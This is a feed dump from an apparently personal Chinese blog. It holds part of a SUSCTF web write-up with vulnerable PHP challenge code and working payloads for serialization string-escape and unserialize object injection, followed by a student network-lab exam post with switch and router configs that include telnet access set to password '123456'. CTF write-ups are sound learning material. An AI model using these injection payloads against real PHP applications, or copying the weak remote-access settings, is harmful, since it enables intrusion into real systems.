class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"z33"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;z33 is "</span> . $_GET[<span class="string">'z33'</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"z33"</span>] === <span class="string">"feiwu"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"rmb"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;rmb is "</span> . $_GET[<span class="string">"rmb"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"rmb"</span>] === <span class="string">"shenxian"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"aa"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;aa is dage of "</span> . $_POST[<span class="string">"aa"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">"aa"</span>] === <span class="string">"z33&amp;rmb"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use POST method to submit aa&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit rmb&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit z33&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./23.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUSCTF{so_who_is_AA}</p><h3 id="刀来！"><a href="#刀来！" class="headerlink" title="刀来！"></a>刀来！</h3><figure class="image-box">                <img src="./24.png" alt="图片" title class>                <p>图片</p>            </figure><p>SUSCTF{f5f397a37b728d927576ae889b908d17}</p><h3 id="Ez-escape1"><a href="#Ez-escape1" class="headerlink" title="Ez_escape1"></a>Ez_escape1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">$number=<span class="number">10086</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">public</span> $number;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line"><span class="keyword">$this</span>-&gt;number=$number;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'nzgnb'</span>,<span class="string">'nzgyyds'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$epoch=filter(serialize(<span class="keyword">new</span> escape($name,$number)));</span><br><span class="line"><span class="keyword">echo</span> $epoch.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$ep0ch=unserialize($epoch);</span><br><span class="line"><span class="keyword">if</span>($ep0ch-&gt;number===<span class="number">1008611</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nzgnb被替换成nzgyyds逃逸2个字符,需要传入的数据长度是26,name传入13个nzgnb即可逃逸<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:4:&quot;name&quot;;s:91:&quot;nzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyyds&quot;;s:6:&quot;number&quot;;i:1008611;&#125;&quot;;s:6:&quot;number&quot;;i:10086;&#125;</span><br><span class="line">U1VTQ1RGe2MyYmQyOWRiNDk1N2JmODBjM2M5OWRlMTliZDRhNjBkfQ==</span><br></pre></td></tr></table></figure></p><p>SUSCTF{c2bd29db4957bf80c3c99de19bd4a60d}</p><h3 id="Ez-escape2"><a href="#Ez-escape2" class="headerlink" title="Ez_escape2"></a>Ez_escape2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$haidilao=$_POST[<span class="string">"haidilao"</span>];</span><br><span class="line">$core=$_POST[<span class="string">"core"</span>];</span><br><span class="line">$num=<span class="string">"2019"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $haidilao;</span><br><span class="line"><span class="keyword">public</span> $core;</span><br><span class="line"><span class="keyword">public</span> $num;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($haidilao,$core,$num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;haidilao=$haidilao;</span><br><span class="line"><span class="keyword">$this</span>-&gt;core=$core;</span><br><span class="line"><span class="keyword">$this</span>-&gt;num=$num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;num===<span class="string">"2020"</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'Haidilao'</span>,<span class="string">'Hedilao'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$btis=filter(serialize(<span class="keyword">new</span> escape2($haidilao,$core,$num)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$btis.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$bt15=unserialize($btis);</span><br></pre></td></tr></table></figure><p>根据过滤后字符串减少的原理,使core传入构造代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"escape2"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"haidilao"</span>;s:<span class="number">8</span>:<span class="string">"Hedilao"</span>;s:<span class="number">4</span>:<span class="string">"core"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">4</span>:<span class="string">"2019"</span>;&#125; <span class="comment">#正常的序列化字符串</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span> <span class="comment"># 需要吃掉的字符</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:3:"</span>num<span class="string">";s:4:"</span><span class="number">2020</span><span class="string">";&#125; # 需要传输的core的值</span></span><br></pre></td></tr></table></figure></p><p>截止到core的值共19个字符,即传入19个Haidilao,替换成Hedilao后吞掉19个字符,使后面的payload补上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haidilao=HaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilao</span><br><span class="line">HaidilaoHaidilaoHaidilaoHaidilao&amp;core=&quot;;s:4:&quot;core&quot;;s:3:&quot;123&quot;;s:3:&quot;num&quot;;s:4:&quot;2020&quot;;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AA-is-who"><a href="#AA-is-who" class="headerlink" title="AA_is_who"></a>AA_is_who</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">protected</span> $power;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">"Aryb1n"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is Aryb1n"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;power &gt; <span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is powerful"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is not so weak"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"who is AA?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// maybe you should consider URL encode?</span></span><br><span class="line">$aa = $_GET[<span class="string">"aa"</span>];</span><br><span class="line">unserialize($aa);</span><br></pre></td></tr></table></figure><p>get接受aa变量的传参,要求$power的值大于100000,$name的值为Aryb1n,使代码序列化<br>$power类型为protected,需要使用%00进行填充补全,也可以将序列化串进行url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=Aryb1n;</span><br><span class="line">    <span class="keyword">protected</span> $power=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> AA();</span><br><span class="line"><span class="keyword">print</span> serialize($a);</span><br><span class="line"><span class="keyword">print</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:2:"AA":2:&#123;s:4:"name";s:6:"Aryb1n";s:8:"*power";i:1000000;&#125;</span></span><br><span class="line"><span class="comment">//O%3A2%3A%22AA%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Aryb1n%22%3Bs%3A8%3A%22%00%2A%00power%22%3Bi%3A1000000%3B%7D</span></span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./25.png" alt="图片" title class>                <p>图片</p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;得到号的时候只剩半天时间了,断断续续做了一些题,有些web题环境关了来不及复现,buu见&lt;/p&gt;
&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>大二下网络工程实训考试</title>
    <link href="https://www.damyahome.github.io/%E6%97%A5%E5%B8%B8/ckwd913eb005opwucpyxqfcil/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%AE%AD%E8%80%83%E8%AF%95/"/>
    <id>https://www.damyahome.github.io/%E6%97%A5%E5%B8%B8/ckwd913eb005opwucpyxqfcil/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%AE%AD%E8%80%83%E8%AF%95/</id>
    <published>2020-10-14T08:31:21.000Z</published>
    <updated>2020-10-14T08:35:44.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h2><figure class="image-box">                <img src="./考试要求.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h2><p>vlan 10</p><p>192.168.学号后三位.x 24</p><p>vlan 20</p><p>192.168.学号后三位+2.x 24</p><p>vlan 30</p><p>192.168.学号后三位+3.x 24</p><p>三层设备互联使用30位掩码</p><h3 id="SW1"><a href="#SW1" class="headerlink" title="SW1"></a>SW1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8</span><br><span class="line">int g0/0/11</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/4</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">int g0/0/2</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  10 pri   8192</span><br><span class="line">stp instance  20 pri   32768</span><br></pre></td></tr></table></figure><hr><h3 id="SW2"><a href="#SW2" class="headerlink" title="SW2"></a>SW2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8</span><br><span class="line">int g0/0/4</span><br><span class="line">p l a</span><br><span class="line">p d v 30</span><br><span class="line">int g0/0/13</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/3</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  20 pri   8192</span><br><span class="line">stp instance  10 pri   32768</span><br></pre></td></tr></table></figure><hr><h3 id="SW3"><a href="#SW3" class="headerlink" title="SW3"></a>SW3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8 13</span><br><span class="line">int g0/0/2</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/3</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/1</span><br><span class="line">p l a</span><br><span class="line">p d v 13</span><br><span class="line">int g0/0/8</span><br><span class="line">p l a</span><br><span class="line">p d v 8</span><br><span class="line">router id 192.168.13.2</span><br><span class="line">ospf</span><br><span class="line">area 0</span><br><span class="line">net 192.168.13.2 0.0.0.0</span><br><span class="line">q</span><br><span class="line">ospf</span><br><span class="line">a 1</span><br><span class="line">net 192.168.8.1 0.0.0.0</span><br><span class="line">q</span><br><span class="line">a 2</span><br><span class="line">net 0.0.0.0 0.0.0.0</span><br><span class="line">q</span><br><span class="line">int vlan  13</span><br><span class="line">ip add 192.168.13.2 30</span><br><span class="line">int vlan 8</span><br><span class="line">ip add 192.168.8.1 30</span><br><span class="line">int v 10</span><br><span class="line">ip add 192.168.136.1 24</span><br><span class="line">int v 20</span><br><span class="line">ip add 192.168.138.1 24</span><br><span class="line">int v 30</span><br><span class="line">ip add 192.168.139.1 24</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  10 pri   4096</span><br><span class="line">stp instance  20 pri   4096</span><br><span class="line">dhcp enable</span><br><span class="line">ip pool v10</span><br><span class="line">net 192.168.136.0 mask 24</span><br><span class="line">gateway-list 192.168.136.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.136.2 192.168.136.10</span><br><span class="line">int vlan 10</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip pool v20</span><br><span class="line">net 192.168.138.0 mask 24</span><br><span class="line">gateway-list 192.168.138.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.138.2 192.168.138.10</span><br><span class="line">int vlan 20</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip pool v30</span><br><span class="line">net 192.168.139.0 mask 24</span><br><span class="line">gateway-list 192.168.139.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.139.2 192.168.139.10</span><br><span class="line">int vlan 30</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><hr><h3 id="SW5"><a href="#SW5" class="headerlink" title="SW5"></a>SW5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 13</span><br><span class="line">int e0/0/1</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int e0/0/2</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">int e0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 13</span><br><span class="line">int v 10</span><br><span class="line">ip add 192.168.136.1 24</span><br><span class="line">q</span><br><span class="line">int v 20</span><br><span class="line">ip add 192.168.138.1 24</span><br><span class="line">q</span><br><span class="line">int v 13</span><br><span class="line">ip add 192.168.13.2 30</span><br><span class="line">q</span><br><span class="line">dhcp en</span><br><span class="line">ip pool v10</span><br><span class="line">net 192.168.136.0 mask 24</span><br><span class="line">gateway-list 192.168.136.1</span><br><span class="line">dns-list 202.106.0.20 </span><br><span class="line">lease day 5</span><br><span class="line">int vlan 10</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip route-s 0.0.0.0 0 192.168.13.1</span><br></pre></td></tr></table></figure><hr><h3 id="AR4"><a href="#AR4" class="headerlink" title="AR4"></a>AR4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 192.168.13.1 30</span><br><span class="line">int g0/0/2</span><br><span class="line">ip add 202.106.2.2 29</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.2.1</span><br><span class="line">ip route-s 192.168.0.0 16 192.168.13.2</span><br><span class="line">acl n 2000</span><br><span class="line">rule p s an</span><br><span class="line">int g0/0/2</span><br><span class="line">nat out 2000</span><br><span class="line">int g0/0/2</span><br><span class="line">nat se p tcp gl 202.106.2.3 tel inside 192.168.13.2 23</span><br><span class="line">super password cipher 123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br></pre></td></tr></table></figure><hr><h3 id="AR1"><a href="#AR1" class="headerlink" title="AR1"></a>AR1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 202.106.1.2 29</span><br><span class="line">q</span><br><span class="line">router id 202.106.1.2 </span><br><span class="line">ospf</span><br><span class="line">area 0</span><br><span class="line">net 192.168.13.1 0.0.0.0</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.1.1</span><br><span class="line">acl 2000</span><br><span 